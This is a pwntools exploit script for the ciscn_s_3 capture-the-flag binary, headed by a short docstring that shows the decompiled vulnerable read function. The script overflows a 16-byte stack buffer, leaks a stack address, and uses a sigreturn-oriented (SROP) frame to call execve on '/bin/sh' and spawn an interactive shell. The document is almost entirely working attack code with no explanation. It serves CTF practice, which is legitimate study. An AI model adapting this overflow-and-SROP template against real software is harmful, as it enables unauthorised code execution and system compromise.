"""ciscn_s_3 srop , CTF竞赛 -- SROP详解
signed __int64 vuln()
{
  signed __int64 v0; // rax
  char buf[16]; // [rsp+0h] [rbp-10h] BYREF

  v0 = sys_read(0, buf, 0x400uLL);
  return sys_write(1u, buf, 0x30uLL);
}
gadgets:  mov     rax, 0Fh;retn;
"""
from pwn import *

context(log_level='debug', arch='amd64')

# p=remote("node4.buuoj.cn",27757)
p = process('./ciscn_s_3')
elf = ELF('./ciscn_s_3')

leak = lambda name, addr: log.success('{} = {:#x}'.format(name, addr))
l64 = lambda: u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

vuln = elf.symbols['vuln']
leak('vuln', vuln)

sig_return = elf.search(asm('mov rax, 0x0F')).__next__()
syscall_ret = elf.search(asm('syscall; ret')).__next__()
gdb.attach(p, 'b *0x000000400517\nc')

payload1 = flat('a' * 0x10, vuln)
p.send(payload1)

binsh = l64() - 0x118
leak('binsh', binsh)
pause()

sigFrame = SigreturnFrame()
sigFrame.rax = 59
sigFrame.rdi = binsh
sigFrame.rsi = 0x0
sigFrame.rdx = 0x0
sigFrame.rip = syscall_ret

payload2 = flat('/bin/sh\00' * 2, sig_return, syscall_ret, sigFrame)
p.send(payload2)

p.interactive()
